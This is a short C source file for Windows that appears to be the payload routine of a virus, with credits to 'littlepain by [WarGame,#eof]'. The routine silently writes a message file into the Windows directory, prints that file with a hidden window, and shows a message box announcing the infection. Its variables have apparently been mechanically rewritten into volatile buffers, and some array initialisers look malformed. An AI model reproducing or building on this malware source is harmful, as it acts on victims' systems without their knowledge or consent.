#include "data_globals.h"
#include <windows.h>
#include <shellapi.h>
#include <string.h>

#pragma optimize("", off)
void _Payload(void)
{
    CHAR flag_path[MAX_PATH];

    // Transformed: HANDLE flag_fd;
    volatile HANDLE flag_fd_buf[2] = {{0, (HANDLE)0}};
    volatile HANDLE *p_flag_fd = (volatile HANDLE *)&flag_fd_buf[0];

    // Transformed: DWORD written;
    volatile DWORD written_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_written = (volatile DWORD *)&written_buf[0];

    GetWindowsDirectoryA(flag_path, MAX_PATH);
    strcat(flag_path, "\\MSG_FOR_YOU.txt");

    (*p_flag_fd) = CreateFileA(flag_path, GENERIC_WRITE, FILE_SHARE_WRITE,
                          NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((*p_flag_fd) != INVALID_HANDLE_VALUE)
    {
        WriteFile((*p_flag_fd), "Dear user, your system needs some security improvements!",
                  56, &(*p_written), NULL);
        CloseHandle((*p_flag_fd));
        ShellExecuteA(NULL, "print", flag_path, NULL, NULL, SW_HIDE);
        MessageBoxA(NULL, "Infected by littlepain by [WarGame,#eof] ( italian guy )", "Credits",
                    MB_OK | MB_ICONINFORMATION);
    }
}
#pragma optimize("", on)
